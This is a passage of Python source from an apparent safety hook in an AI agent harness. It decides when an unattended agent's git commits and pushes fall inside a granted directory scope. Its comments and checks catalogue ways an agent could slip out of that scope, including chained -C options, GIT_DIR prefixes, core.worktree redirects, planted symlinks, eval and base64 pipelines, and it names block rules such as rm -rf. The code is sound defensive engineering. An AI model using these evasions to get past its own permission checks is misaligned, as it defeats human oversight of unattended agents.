#     closed on the COMMIT side: scope evaluation now reads the resolved
#     repo's ``core.worktree`` and measures the redirect target against the
#     scope, so a redirected in-scope store refuses the commit. The
#     command-line spellings (``-c core.worktree=…``, ``--config-env``,
#     ``include.path``) refuse outright.
#   * Resolution is a TOCTOU window — the hook validates a path the command has
#     not used yet.
#
# Hard ``block`` rules (rm -rf, git push --force, …) are unaffected — they fire
# regardless. Interactive bypass sessions (no ``AGENTWIRE_UNATTENDED``) are
# unaffected too — their ``ask`` still resolves the old way.

# The built-in grants. Written in the SAME shape as a task's
# ``unattended_allow`` (bare id = unscoped, or ``{id, paths}`` = scoped) and
# parsed by the same parser, so a scope is expressible HERE too — not only in a
# per-task entry (#914 review §2). That matters because these ids are the
# widest grants in the system: ``git.commit`` / ``git.push`` unscoped means any
# repo on the machine, in every scheduled task, forever.
#
# They are deliberately left UNSCOPED here — narrowing them is a host policy
# decision, not something this file should make on every install's behalf, and
# a task that needs a narrower grant can already express it: naming a rule at a
# more specific level REPLACES this one (see the precedence note above), so a
# task's ``{id: git.commit, paths: [<store>]}`` genuinely binds rather than
# being swallowed by this unscoped default. A host that wants the narrow form
# machine-wide writes the scoped entry in ``~/.agentwire/damagecontrol.yml``.
#
# NOTE (#916 / review §2): these ids only exist if the LOADED tooldefs carry
# them. ``~/.agentwire/tooldefs/`` wins over the bundled copy and never
# self-heals, so on a drifted install five of the six name no rule at all and
# every one of these actions is blocked unattended. ``agentwire doctor`` now
# reports that (``_check_unattended_defaults``) instead of leaving it to be
# rediscovered as a nightly timeout.
DEFAULT_UNATTENDED_ALLOW = [
    "git.add",       # stage files
    "git.add-u",     # stage tracked changes
    "git.commit",    # commit
    "git.push",      # push (force/delete are SEPARATE hard-block/ask rules)
    "gh.pr-create",  # open a PR — the human-reviewed gate
    "outbound.agentwire-email",  # blanket allow, any recipient (#804)
    # Run the project's own tooling — tests, linters, the project CLI (#925).
    #
    # This tier is `ask` because `uv run` executes code, which is true of every
    # scheduled task by definition: the dispatch already granted "run this
    # agent on this repo". Withholding the project's OWN test runner from it
    # does not withhold code execution, it only withholds VERIFICATION — the
    # task still writes the change and still opens the PR, just without having
    # been able to run the suite over it. 18 of the 111 unattended blocks
    # measured over the 14 days to 2026-08-06 were exactly this.
    #
    # Safe to allow only because the id it grants cannot shadow a hard block.
    # Verified, not assumed: rules are evaluated in order and the FIRST match
    # returns its id, so an earlier `ask` rule CAN hide a later `block` — the
    # matrix in tests/unit/test_unattended_allow.py pins that every dangerous
    # form behind `uv run` still comes back with the DESTRUCTIVE rule's id, not
    # this one (the launcher-payload rescan that guarantees it landed in #1028).
    #
    # BOTH ids, deliberately. `uv run <script.py>` and `uv run <cmd>` are two
    # tooldef lines that compile to the IDENTICAL pattern `\buv\s+run\b`, so
    # which id a command comes back with is decided by which yaml line sits
    # higher, not by anything about the command. Allowlisting only one would be
    # guarding the phrasing: reorder uv.yaml and the permission silently
    # evaporates with nothing failing to say so.
    "tooldef.uv-run-a-script-in-project-environment",
    "tooldef.uv-run-a-command-in-project-environment",
]


def is_unattended() -> bool:
    """True when this session was dispatched with no human present (scheduler)."""
    return os.environ.get("AGENTWIRE_UNATTENDED") == "1"


# ---------------------------------------------------------------------------
# Grant parsing
# ---------------------------------------------------------------------------


def parse_unattended_allow(raw: Any) -> Tuple[Dict[str, List[List[str]]], List[str]]:
    """Parse one ``unattended_allow`` list into ``({id: [scope, ...]}, errors)``.

    A ``scope`` is a list of absolute path patterns; the EMPTY list means
    unscoped. So ``{"git.commit": [[]]}`` grants commits anywhere, while
    ``{"git.commit": [["~/x/"]]}`` grants them only under ``~/x/``.

    ``errors`` describes entries that were REFUSED — malformed shapes, missing
    ids, relative path patterns. A refused entry that NAMED a rule id maps that
    id to the EMPTY scope list ``[]``, which is distinct from absent:

        absent (``None``)  -> this layer says nothing; a looser layer may grant
        ``[]``             -> this layer named the rule and granted nothing
        ``[[]]``           -> unscoped grant
        ``[[p, …]]``       -> scoped grant

    That distinction is load-bearing, and getting it wrong is a WIDENING. If a
    refused entry simply vanished, ``{id: git.commit, paths: [typo/relative]}``
    would fall through to the unscoped ``git.commit`` in
    ``DEFAULT_UNATTENDED_ALLOW`` — so a typo in a scope path would grant commits
    EVERYWHERE, which is worse than the grant the host was trying to write.
    Naming a rule always binds it, valid or not.
    """
    grants: Dict[str, List[List[str]]] = {}
    errors: List[str] = []
    if raw is None:
        return grants, errors
    if not isinstance(raw, (list, tuple)):
        return grants, [f"unattended_allow must be a list, got {type(raw).__name__}"]

    for entry in raw:
        if isinstance(entry, str):
            rid = entry.strip()
            if rid:
                grants.setdefault(rid, []).append([])
            continue
        if not isinstance(entry, dict):
            errors.append(f"entry must be a rule id or a mapping, got {entry!r}")
            continue
        rid = str(entry.get("id", "")).strip()
        if not rid:
            errors.append(f"entry {entry!r} has no `id`")
            continue
        # Naming a rule BINDS it at this layer, whatever happens to the rest of
        # the entry. `setdefault` alone (below) would leave a refused entry
        # absent, and absent falls through to the looser layer — so a typo in a
        # scope path would silently grant the rule everywhere.
        grants.setdefault(rid, [])
        unknown = sorted(set(entry) - {"id", "paths"})
        if unknown:
            # Same reasoning as TaskConfig.unknown_keys (#867): a key we ignore
            # is a constraint the author believes they set.
            errors.append(f"{rid}: ignored key(s) {', '.join(unknown)}")
        raw_paths = entry.get("paths")
        if raw_paths is None:
            grants.setdefault(rid, []).append([])
            continue
        if not isinstance(raw_paths, (list, tuple)):
            errors.append(f"{rid}: `paths` must be a list")
            continue
        scope: List[str] = []
        bad = False
        for p in raw_paths:
            p = str(p).strip()
            if not p:
                continue
            if not (p.startswith("/") or p.startswith("~")):
                # A relative scope has no fixed meaning — it would silently
                # change with the dispatch cwd, which is the one thing a scope
                # exists to pin down. Refuse the whole entry.
                errors.append(f"{rid}: scope path must be absolute or ~-rooted, got {p!r}")
                bad = True
                continue
            scope.append(p)
        if bad:
            continue
        if not scope:
            errors.append(f"{rid}: `paths` is empty — write a bare rule id for an unscoped grant")
            continue
        grants.setdefault(rid, []).append(scope)
    return grants, errors


def _env_unattended_allow() -> Any:
    """Decode ``AGENTWIRE_UNATTENDED_ALLOW`` into an ``unattended_allow`` list.

    Two wire forms, discriminated unambiguously (a rule id can never start with
    ``[``): a JSON array when any entry is scoped, else the plain
    comma-separated id list — which stays readable in ``tmux show-environment``
    for the common case. ``scheduler/dispatch.py::_unattended_env`` is the only
    writer; see ``encode_unattended_allow``.
    """
    raw = os.environ.get("AGENTWIRE_UNATTENDED_ALLOW", "")
    if not raw.strip():
        return []
    if raw.lstrip().startswith("["):
        try:
            decoded = json.loads(raw)
        except ValueError:
            # Undecodable ⇒ grant NOTHING rather than fall back to a comma
            # split that would read `{"id": "x"` as a rule id.
            return []
        return decoded if isinstance(decoded, list) else []
    return [part.strip() for part in raw.split(",") if part.strip()]


def encode_unattended_allow(entries: Any) -> str:
    """Encode an ``unattended_allow`` list for ``AGENTWIRE_UNATTENDED_ALLOW``."""
    items = list(entries or [])
    if any(not isinstance(e, str) for e in items):
        return json.dumps(items, separators=(",", ":"))
    return ",".join(e.strip() for e in items if e and e.strip())


def resolve_unattended_grants(config: Dict[str, Any]) -> Dict[str, List[List[str]]]:
    """Effective unattended grants: ``{rule id: [scope, ...]}``.

    Precedence, most specific wins outright (see the section header): per-task
    env > host config > ``DEFAULT_UNATTENDED_ALLOW``.
    """
    safety_cfg = config.get("safety", {}) if isinstance(config.get("safety"), dict) else {}
    layers = [
        parse_unattended_allow(_env_unattended_allow())[0],
        parse_unattended_allow(safety_cfg.get("unattended_allow"))[0],
        parse_unattended_allow(DEFAULT_UNATTENDED_ALLOW)[0],
    ]
    merged: Dict[str, List[List[str]]] = {}
    for layer in layers:
        for rid, scopes in layer.items():
            if rid not in merged:
                merged[rid] = scopes
    return merged


# ---------------------------------------------------------------------------
# Scope evaluation — which directories would this command act on?
# ---------------------------------------------------------------------------

# Builtins that move the working directory. Their effect on a LATER subcommand
# is not statically knowable, so their presence makes the whole command
# unscopeable.
_CWD_CHANGING = {"cd", "pushd", "popd", "chdir"}

# Programs whose job is to run ANOTHER program. The rule matched text inside
# them, so the directory the real work happens in is whatever the inner command
# decides — not something this parser can claim to know.
_INDIRECT_RUNNERS = {
    "sh", "bash", "zsh", "dash", "ksh", "fish",
    "env", "xargs", "sudo", "doas", "su", "ssh", "nohup", "setsid",
    "timeout", "nice", "ionice", "stdbuf", "script", "watch", "parallel",
    "command", "exec", "time", "find", "make", "nix-shell", "docker", "podman",
} | _PREFIX_WRAPPERS

# git's directory-redirecting global options. `-C` and `--git-dir` /
# `--work-tree` all accept BOTH `--opt=<path>` and `--opt <path>` against the
# real binary (verified on git 2.50.1 in #913's review), so both are parsed.
#
# COORDINATION WITH #913: that issue normalizes git's global options out of the
# command BEFORE rule matching, so every git rule stops being defeated by
# `git -C <dir> …`. This function is the shared parser for that grammar —
# #913's normalizer should consume `git_global_dirs` rather than write a second
# copy, and the two have opposite needs on the same data: the normalizer wants
# the options GONE, scope evaluation wants the directory they name. Splitting
# it here gives both from one implementation.
_GIT_DIR_OPTS_VALUE = {"-C", "--git-dir", "--work-tree"}

# Global options that take a separate value but name no DIRECTORY. Their value
# must still be consumed, or it gets mistaken for the subcommand.
# ``--exec-path`` is deliberately absent: bare ``--exec-path`` makes git print
# the exec path and exit, so ``git --exec-path status`` never runs ``status`` —
# consuming a token there would swallow a subcommand a rule needs to see. Only
# its ``=`` form carries a value, which the generic ``-`` branch handles.
_GIT_OPTS_VALUE_NOT_DIR = {
    "-c", "--config-env", "--namespace", "--attr-source", "--super-prefix",
}

# Environment assignments git honours to pick a DIFFERENT repo than the cwd.
# `GIT_DIR=<other> git commit` beats the working directory outright (verified
# against git 2.50.1), so an assignment prefix is a repo selector exactly like
# `-C` — and one that `_strip_assignments` used to discard before anything
# looked at it.
_GIT_DIR_ENV_VARS = {
    "GIT_DIR", "GIT_WORK_TREE", "GIT_COMMON_DIR", "GIT_INDEX_FILE",
    "GIT_OBJECT_DIRECTORY", "GIT_ALTERNATE_OBJECT_DIRECTORIES",
    "GIT_CEILING_DIRECTORIES", "GIT_NAMESPACE",
}


def git_global_dirs(argv: List[str]) -> Tuple[Dict[str, Any], List[str]]:
    """Split a ``git`` argv into ``(directory selectors, remaining argv)``.

    Selectors are returned STRUCTURED, not as one flat list, because the three
    options do not relate to each other or to the cwd the same way — and a flat
    list cannot express either relationship. Verified against real git 2.50.1:

    * ``-C`` is **CUMULATIVE**, folded left to right, each value resolved
      against the previous result (an absolute value resets the chain)::

          $ git -C outer -C inner rev-parse --show-prefix
          inner/                       # not `outer/`, and not `inner` from cwd

      Resolving each ``-C`` against the cwd instead collapses
      ``git -C <in-scope> -C ../..`` onto the in-scope directory, so a scope
      check sees one in-scope target and grants while git chdirs out of it.

    * ``--git-dir`` / ``--work-tree`` are **LAST-ONE-WINS**, and a relative
      value resolves against the directory the ``-C`` chain produced::

          $ cd <base>; git -C other --git-dir=.git rev-parse --absolute-git-dir
          <base>/other/.git            # relative to the -C result, not to cwd

    ``remaining argv`` is the command with git's global options removed —
    ``["git", "commit", "-m", "x"]`` for ``git -C /r commit -m x`` — which is
    the form a rule pattern like ``\\bgit\\s+commit\\b`` was written against.
    """
    chdir: List[str] = []
    git_dir: Optional[str] = None
    work_tree: Optional[str] = None
    config: List[str] = []
    rest: List[str] = argv[:1]

    def _record(opt: str, value: str) -> None:
        nonlocal git_dir, work_tree
        if opt == "-C":
            chdir.append(value)
        elif opt == "--git-dir":
            git_dir = value
        else:
            work_tree = value

    i = 1
    while i < len(argv):
        tok = argv[i]
        if tok in _GIT_DIR_OPTS_VALUE:
            if i + 1 < len(argv):
                _record(tok, argv[i + 1])
            i += 2
            continue
        if tok in _GIT_OPTS_VALUE_NOT_DIR:
            # `-c key=value` / `--config-env key=ENVVAR` set config from the
            # command line — the same power as editing the repo config, so
            # their assignments are surfaced for the caller to inspect
            # (core.worktree / include.* redirect the repo; #927).
            if tok in ("-c", "--config-env") and i + 1 < len(argv):
                config.append(argv[i + 1])
            i += 2
            continue
        matched = False
        for opt in _GIT_DIR_OPTS_VALUE:
            if tok.startswith(opt + "="):
                _record(opt, tok[len(opt) + 1:])
                matched = True
                break
        if matched:
            i += 1
            continue
        if tok.startswith("--config-env="):
            config.append(tok[len("--config-env="):])
            i += 1
            continue
        if tok.startswith("-"):
            i += 1
            continue
        rest.extend(argv[i:])
        break
    return {"chdir": chdir, "git_dir": git_dir, "work_tree": work_tree,
            "config": config}, rest


def _git_repo_root(path: str) -> Optional[str]:
    """Nearest enclosing directory containing ``.git``, walking up from ``path``.

    git resolves the repo by walking UP, so the directory a command runs in is
    not the repo it commits to. A scope naming ``<repo>/subdir`` would otherwise
    grant over the whole of ``<repo>`` — silently, because the cwd it measured
    really is inside the scope. Pure filesystem probing, no subprocess: the hook
    is on the tool's hot path.

    ``.git`` may be a file (worktrees, submodules) as well as a directory; both
    count. Returns None when nothing is found — which happens for a path that
    does not exist yet, so callers must not read None as "no constraint
    needed" for a security decision, only as "no repo root discoverable".
    """
    current = os.path.abspath(path)
    while True:
        if os.path.exists(os.path.join(current, ".git")):
            return current
        parent = os.path.dirname(current)
        if parent == current:
            return None
        current = parent


def _split_assignments(argv: List[str]) -> Tuple[List[str], List[str]]:
    """Split leading ``VAR=value`` prefixes off an argv.

    Returns ``(assignments, rest)`` — NOT just ``rest``. Discarding them is how
    ``GIT_DIR=<other-repo> git commit`` slipped past scope evaluation entirely:
    the redirect vanished before anything looked at it and the check fell back
    to the cwd, which was in scope. An assignment prefix is a repo selector
    exactly like ``-C``.
    """
    i = 0
    while i < len(argv) and _ASSIGN_TOKEN_RE.match(argv[i]):
        i += 1
    return argv[:i], argv[i:]


# Shell operators, and the grouping tokens that make a segment's execution
# context something this parser will not reason about.
_SCOPE_OPERATORS = {";", "&&", "||", "|", "&", "\n", ";;", "|&"}
_SCOPE_GROUPING = {"(", ")", "{", "}"}

# Placeholder a masked command substitution collapses to. No whitespace, no
# shell metacharacters — it stays inside whatever token the substitution was
# part of, so positional analysis can ask "does THIS token carry a
# substitution?" instead of refusing the whole command (#942/#943).
_CMD_SUBST_SENTINEL = "\x00cmdsub\x00"


def _mask_command_substitutions(command: str) -> Tuple[str, Optional[str]]:
    """Collapse every ``$(...)`` / backtick span to a sentinel token.

    Returns ``(masked, error)``. Scope evaluation used to refuse on a
    substitution ANYWHERE in the command (#942/#943), which refused #914's own
    motivating case — ``git commit -m "review $(date +%F)"`` in an in-scope
    store — even though a substitution in the commit message cannot move the
    command. Masking instead lets the positional analysis below decide: a
    sentinel in a directory-deciding position (a ``cd`` target, ``-C`` /
    ``--git-dir`` / ``--work-tree``, a ``GIT_DIR``-family assignment, the
    segment head) still refuses; a sentinel in an operand does not.

    ``$(...)`` is scanned with paren balancing (nesting is real:
    ``$(dirname $(pwd))``); an unclosed span refuses. A paren inside quotes
    inside the substitution can close the span early — the leftover text then
    fails tokenization or lands somewhere refusable, which errs closed.
    """
    out: List[str] = []
    i, n = 0, len(command)
    while i < n:
        if command.startswith("$(", i):
            depth, j = 1, i + 2
            while j < n and depth:
                if command[j] == "(":
                    depth += 1
                elif command[j] == ")":
                    depth -= 1
                j += 1
            if depth:
                return "", "command substitution is unbalanced"
            out.append(_CMD_SUBST_SENTINEL)
            i = j
            continue
        if command[i] == "`":
            j = command.find("`", i + 1)
            if j == -1:
                return "", "command substitution is unbalanced"
            out.append(_CMD_SUBST_SENTINEL)
            i = j + 1
            continue
        out.append(command[i])
        i += 1
    return "".join(out), None


# ``git config core.worktree`` redirects a repo from inside its own config —
# the #927 two-step escape: point the in-scope store's work tree elsewhere,
# then commit entirely within scope. The command-line spellings of the same
# redirect (``-c core.worktree=…``, ``--config-env=core.worktree=…``, and the
# ``include.path``/``includeIf.*`` keys that can pull core.worktree in from an
# arbitrary file) are refused below; the in-repo-config spelling is closed by
# READING the resolved repo's config and measuring the redirect target against
# the scope like any other selector (see _git_config_core_worktree).
_GIT_SECTION_RE = re.compile(r"^\s*\[([^\]]*)\]")
_GIT_WORKTREE_LINE_RE = re.compile(r"^\s*worktree\s*=\s*(.*?)\s*$", re.IGNORECASE)


def _dir_redirecting_config_key(key: str) -> bool:
    """True when a git config key can redirect which directory a repo acts on."""
    k = key.strip().lower()
    return k == "core.worktree" or k.startswith("include.") or k.startswith("includeif.")


def _git_config_core_worktree(root: str) -> Optional[str]:
    """``core.worktree`` from the repo at ``root``, resolved absolute, or None.

    Pure filesystem reading (the hook is on the tool's hot path — same
    constraint as ``_git_repo_root``): follow a ``.git`` FILE's ``gitdir:``
    pointer, then line-scan ``config`` and ``config.worktree`` for a
    ``[core] worktree`` entry, last one wins. A relative value resolves against
    the git dir, matching git's own reading. Best-effort by construction — an
    unreadable config returns None, which means "no redirect discoverable",
    not "no redirect"; the command-line spellings are refused separately.
    """
    gitdir = os.path.join(root, ".git")
    if os.path.isfile(gitdir):
        try:
            with open(gitdir, encoding="utf-8", errors="replace") as fh:
                first = fh.readline()
        except OSError:
            return None
        if not first.startswith("gitdir:"):
            return None
        gitdir = _abs_path(first.split(":", 1)[1].strip(), root)
    value: Optional[str] = None
    for name in ("config", "config.worktree"):
        try:
            with open(os.path.join(gitdir, name), encoding="utf-8", errors="replace") as fh:
                in_core = False
                for line in fh:
                    section = _GIT_SECTION_RE.match(line)
                    if section:
                        in_core = section.group(1).strip().lower() == "core"
                        continue
                    if in_core:
                        m = _GIT_WORKTREE_LINE_RE.match(line)
                        if m:
                            value = m.group(1).strip().strip('"')
        except OSError:
            continue
    if not value:
        return None
    return _abs_path(value, gitdir)


def _scope_segments(
    command: str, grouping_ok: bool = False
) -> Tuple[List[Tuple[List[str], str]], Optional[str]]:
    """Split ``command`` into ``[(argv, operator_that_follows)]``.

    This is a SECOND, deliberately separate splitter from
    ``normalize_subcommands`` — that one discards the operators, and scope
    evaluation needs them: ``cd X && git commit`` and ``cd X ; git commit``
    describe different directories for the same ``git commit``.

    RULING (#931): do NOT consolidate this into ``normalize_subcommands``.
    They are not duplicates — ``normalize_subcommands`` DISCARDS shell
    operators, and scope evaluation NEEDS them. A merge that keeps the
    operator-discarding behaviour silently reopens the ``;`` case: the scope
    check still returns *an* answer, just the wrong one for that spelling, and
    nothing goes red. The SSOT rule is right in general and wrong here — the
    cost of the duplication is two similar functions; the cost of the merge is
    a silent scope escape. If anyone ever does unify them, the shared helper
    must preserve operators and let each caller decide, with a test asserting
    the ``;`` and ``&&`` forms evaluate to the same scope decision.

    ``grouping_ok`` makes ``( ) { }`` plain separators instead of a refusal.
    Only the concealment check wants that: it walks every inner command
    itself, so a group or function body adds no hidden verb. Scope evaluation
    needs the refusal — a subshell's cwd cannot be modelled.
    """
    try:
        lex = shlex.shlex(command, posix=True, punctuation_chars=True)
        lex.whitespace_split = True
        tokens = list(lex)
    except ValueError:
        return [], "unbalanced quotes"

    segments: List[Tuple[List[str], str]] = []
    cur: List[str] = []
    for tok in tokens:
        if tok in _SCOPE_GROUPING and grouping_ok:
            segments.append((cur, ";"))
            cur = []
            continue
        if tok in _SCOPE_GROUPING:
            return [], "command uses a subshell/group — execution context is not statically knowable"
        if tok in _SCOPE_OPERATORS:
            segments.append((cur, tok))
            cur = []
            continue
        cur.append(tok)
    segments.append((cur, ""))
    return [(argv, op) for argv, op in segments if argv or op], None


def _cd_target(argv: List[str]) -> Optional[str]:
    """Directory a ``cd`` segment moves to, or None when it is not resolvable.

    Only the literal forms are resolved. ``cd -`` (previous dir), ``cd $VAR``
    and anything with extra operands are deliberately unresolved — a scope that
    guessed here would be measuring the wrong directory.
    """
    if len(argv) == 1:
        return os.path.expanduser("~")
    if len(argv) != 2:
        return None
    target = argv[1]
    if target == "-" or "$" in target or _CMD_SUBST_SENTINEL in target:
        return None
    return target


def _abs_path(raw: str, base: str) -> str:
    """``raw`` as a normalized absolute path, interpreted relative to ``base``.

    Single-valued, unlike :func:`_resolve_dir` — used where a path must be
    threaded into a further resolution (folding a ``-C`` chain), where two
    candidate forms would have nothing to fold onto.
    """
    expanded = os.path.expanduser(raw)
    if not os.path.isabs(expanded):
        expanded = os.path.join(base, expanded)
    return os.path.normpath(expanded)


def _resolve_dir(raw: str, cwd: str) -> List[str]:
    """Absolute forms of ``raw`` interpreted relative to ``cwd``.

    Returns BOTH the lexically-normalized path and its ``realpath``. Both must
    land in scope for a grant to apply: normalizing alone lets
    ``<store>/../../..`` escape, and realpath alone lets a scope pattern be
    dodged by a symlink planted inside the scope — which the grantee can do,
    since ``ln -s`` / ``mkdir`` / ``git init`` are all allowed unattended
    (review §5). The grantee-can-write-inside-the-scope case is the threat
    model, not a cooperative caller.
    """
    expanded = os.path.expanduser(raw)
    if not os.path.isabs(expanded):
        expanded = os.path.join(cwd, expanded)
    normalized = os.path.normpath(expanded)
    out = [normalized]
    try:
        real = os.path.realpath(normalized)
    except OSError:
        return out
    if real != normalized:
        out.append(real)
    return out


def command_scope_dirs(
    command: str,
    cwd: str,
    pattern: Optional[str] = None,
) -> Tuple[List[str], Optional[str]]:
    """Directories the rule-matching parts of ``command`` would act on.

    Returns ``(dirs, unscopeable)``. ``unscopeable`` is a reason string when the
    answer cannot be established — the caller must then NOT apply a scoped
    grant. ``dirs`` holds absolute paths (normalized and, where different,
    realpath'd); EVERY one of them must be in scope for the grant to apply
    (all-paths semantics, matching ``is_command_path_allowed``).

    Three independent selectors decide which repo a git command touches — the
    working directory, ``-C``, and ``--git-dir``/``--work-tree`` — so all three
    are read, and a command that names both an in-scope and an out-of-scope one
    is refused on the out-of-scope one.

    Only the segments the rule's own ``pattern`` matches are considered, so an
    innocuous tail (``git -C <store> commit -m x && echo done``) does not drag
    the session cwd into the scope test.

    Reads the RAW command, never a normalized haystack — so it is independent
    of #913's land order (the orchestrator ruling keeps the raw command
    reachable precisely so this stays true). The one transformation applied is
    its own: ``$(...)``/backtick spans are masked to a sentinel so substitution
    can be judged by POSITION rather than by presence (#942/#943).
    """
    if pattern and pattern.startswith("ambiguous:"):
        return [], pattern.split(":", 1)[1] or "unverifiable command"

    # Substitution is judged BY POSITION, not by presence (#942/#943): mask
    # every `$(...)`/backtick span to a sentinel first, then refuse only when
    # the sentinel lands somewhere that decides a directory. Refusing on
    # presence refused `git commit -m "$(date +%F)"` — #914's own motivating
    # case. eval / base64-decode stay whole-command refusals: they conceal the
    # VERB, which no positional argument analysis can recover. They are checked
    # on the masked form so an eval inside a message substitution (which cannot
    # move the command) does not refuse.
    command, mask_err = _mask_command_substitutions(command)
    if mask_err:
        return [], mask_err
    if has_command_position_eval(command):
        return [], "eval"
    if _BASE64_PIPE_RE.search(command):
        return [], "base64-decode pipeline"

    segments, split_err = _scope_segments(command)
    if split_err:
        return [], split_err
    if not segments:
        return [], "no command to evaluate"

    dirs: List[str] = []
    considered = 0
    current_dir = cwd

    for argv, following_op in segments:
        if strip_command_opener_words(argv) != argv:
            return [], (
                "command uses compound-command syntax (if/then/do/{/!/case/time) — "
                "the execution context is not statically knowable"
            )
        assigns, argv = _split_assignments(argv)
        if not argv:
            continue
        head = os.path.basename(argv[0])

        if head in _CWD_CHANGING:
            # A `cd` only pins the directory for what follows when the shell
            # guarantees it ran AND succeeded — i.e. when `&&` joins them. With
            # `;` the next segment runs even if the `cd` failed, so it could
            # execute in either directory and we will not pick one.
            if head != "cd":
                return [], f"command uses {head} — directory stack is not statically knowable"
            if following_op != "&&":
                return [], (
                    f"`cd` is joined by '{following_op or 'nothing'}' rather than '&&', so the "
                    "directory the next command runs in is not statically knowable"
                )
            target = _cd_target(argv)
            if target is None:
                return [], "`cd` target is not a literal path"
            resolved = _resolve_dir(target, current_dir)
            # `cd` through a symlink leaves the shell's logical cwd at the
            # symlink path, so track the lexical form; the realpath form is
            # still checked below via _resolve_dir on the acting segment.
            current_dir = resolved[0]
            continue

        is_git = head == "git"
        gopts, stripped = (
            git_global_dirs(argv) if is_git
            else ({"chdir": [], "git_dir": None, "work_tree": None,
                   "config": []}, argv)
        )

        if pattern:
            # Match the rule against BOTH the segment as written and its
            # git-global-stripped form. The first is what matches today; the
            # second is what will match once #913 normalizes those options away
            # before rule matching. Handling both keeps scope evaluation
            # correct on either side of that change.
            haystacks = [" ".join(assigns + argv), " ".join(assigns + stripped)]
            try:
                if not any(_rx(pattern).search(h) for h in haystacks):
                    continue
            except re.error:
                return [], "rule pattern is not a usable regex"
        considered += 1

        if head in _INDIRECT_RUNNERS:
            return [], f"command runs through {head} — target directory is not statically knowable"

        if _CMD_SUBST_SENTINEL in argv[0]:
            # A substituted verb (or a substituted path TO the verb) — what
            # runs is not statically knowable. Checked on the full token, not
            # `head`: basename() would strip `$(...)/git` down to `git`.
            return [], "command substitution decides what runs"

        # git config set from the command line has the same power as editing
        # the repo config: `-c core.worktree=<elsewhere>` redirects the repo
        # exactly like the #927 two-step, and `include.path` can pull such a
        # redirect in from an arbitrary file. Refuse those keys, and any
        # assignment whose key cannot be read.
        for centry in gopts["config"]:
            key, _, _ = centry.partition("=")
            if _CMD_SUBST_SENTINEL in key or not key.strip():
                return [], "command substitution decides a git config key"
            if _dir_redirecting_config_key(key):
                return [], (
                    f"command sets git config {key.strip()} — a work-tree "
                    "redirect makes the target directory not statically knowable"
                )

        # Fold the `-C` chain FIRST — it establishes the directory everything
        # else on this segment is measured from. Left to right, each value
        # against the running result, an absolute value resetting the chain
        # (real git semantics; see git_global_dirs). Resolving each `-C`
        # against the cwd instead lets `git -C <in-scope> -C ../..` collapse
        # onto the in-scope directory and be granted while git walks out of it.
        acting_dir = current_dir
        for hop in gopts["chdir"]:
            if _CMD_SUBST_SENTINEL in hop:
                return [], "command substitution decides the -C target directory"
            acting_dir = _abs_path(hop, acting_dir)
        dirs.extend(_resolve_dir(acting_dir, current_dir))

        # `--git-dir` / `--work-tree` are last-one-wins and resolve against the
        # `-C` result, not the cwd.
        for selector in (gopts["git_dir"], gopts["work_tree"]):
            if selector:
                if _CMD_SUBST_SENTINEL in selector:
                    return [], "command substitution decides the git directory"
                dirs.extend(_resolve_dir(selector, acting_dir))

        # Environment assignments. Recognized git repo selectors are read as
        # target directories; ANY other assignment refuses, because we cannot
        # know whether an env var we do not model redirects the tool. This is
        # the same answer `env VAR=… git commit` already got by being an
        # indirect runner — the two spellings of one redirection now agree.
        # Resolved against the acting directory for the same reason as above.
        for assign in assigns:
            name, _, value = assign.partition("=")
            if name in _GIT_DIR_ENV_VARS:
                if _CMD_SUBST_SENTINEL in value:
                    return [], f"command substitution decides the {name} target"
                if value:
                    dirs.extend(_resolve_dir(value, acting_dir))
                continue
            return [], (
                f"command sets {name} — an environment override may redirect "
                f"{head} to a different target, which is not statically knowable"
            )

        if head == "git":
            # git resolves its repo by walking UP from the working directory, so
            # the directory the command runs in is NOT necessarily the repo it
            # writes to. Require the enclosing repo ROOT to be in scope as well.
            #
            # CHOSEN over the alternative of refusing a non-root scope at lint
            # time: a lint sees only the scope as written, and a scope like
            # `~/.claude/projects/*/memory/` is legitimate right up until
            # someone runs `git init ~/.claude`, after which every memory store
            # is a subdirectory of one big repo. Checking at decision time
            # follows the filesystem instead of a snapshot of it.
            for candidate in list(dirs):
                root = _git_repo_root(candidate)
                if root:
                    dirs.extend(_resolve_dir(root, current_dir))
                    # The repo can be redirected from INSIDE its own config
                    # (`git config core.worktree <elsewhere>` — the #927
                    # two-step escape), which no reading of the command can
                    # see. Read the config and measure the redirect target
                    # like any other selector: an out-of-scope redirect then
                    # refuses the commit even though the command itself stays
                    # entirely within scope.
                    redirect = _git_config_core_worktree(root)
                    if redirect:
                        dirs.extend(_resolve_dir(redirect, current_dir))

    if pattern and considered == 0:
        # The rule matched the command as a whole but no individual segment —
        # e.g. it matched inside an `sh -c` payload that `masked_subcommands`
        # re-scanned. We cannot say which directory that would touch.
        return [], "no subcommand matched the rule — target directory is not statically knowable"
    if not dirs:
        return [], "no target directory could be determined"
    # Stable order, no duplicates.
    return sorted(set(dirs)), None


_GLOB_CHARS = set("*?[")


def _scope_variants(scope_pattern: str) -> List[str]:
    """The scope pattern, plus a form with its literal prefix realpath'd.

    Resolve BOTH sides before comparing (review §5). The candidate path is
    offered in normalized and realpath'd form; the scope needs the same
    treatment or a scope rooted under a symlinked directory (``~/.claude`` ->
    elsewhere) would reject its own legitimate contents. Only the literal
    prefix up to the first glob character can be resolved — the rest is a
    pattern, not a path.
    """
    expanded = os.path.normpath(os.path.expanduser(scope_pattern).rstrip("/"))
    variants = [expanded]
    idx = next((i for i, ch in enumerate(expanded) if ch in _GLOB_CHARS), None)
    literal = expanded if idx is None else expanded[:idx].rsplit("/", 1)[0]
    if not literal or not os.path.isabs(literal):
        return variants
    try:
        real = os.path.realpath(literal)
    except OSError:
        return variants
    if real != literal:
        variants.append(real + expanded[len(literal):])
    return variants


def path_in_scope(path: str, scope_pattern: str) -> bool:
    """True when ``path`` is the directory ``scope_pattern`` names, or under it.

    ``*`` matches within one path segment, ``**`` crosses segments — the same
    reading as the rest of the rule files. Matching is exact (no case folding):
    a scope is a security boundary, and on a case-insensitive filesystem a
    permissive fold is the wrong direction to be wrong in.
    """
    normalized = os.path.normpath(path)
    for variant in _scope_variants(scope_pattern):
        if not variant:
            continue
        regex = ""
        i = 0
        while i < len(variant):
            ch = variant[i]
            if ch == "*":
                if variant[i:i + 2] == "**":
                    regex += ".*"
                    i += 2
                    continue
                regex += "[^/]*"
            elif ch == "?":
                regex += "[^/]"
            else:
                regex += re.escape(ch)
            i += 1
        try:
            if _rx(regex + r"(?:/.*)?", 0).fullmatch(normalized):
                return True
        except re.error:
            continue
    return False


def unattended_grant_allows(
    rule_id: Optional[str],
    command: str,
    grants: Dict[str, List[List[str]]],
    cwd: str,
    pattern: Optional[str] = None,
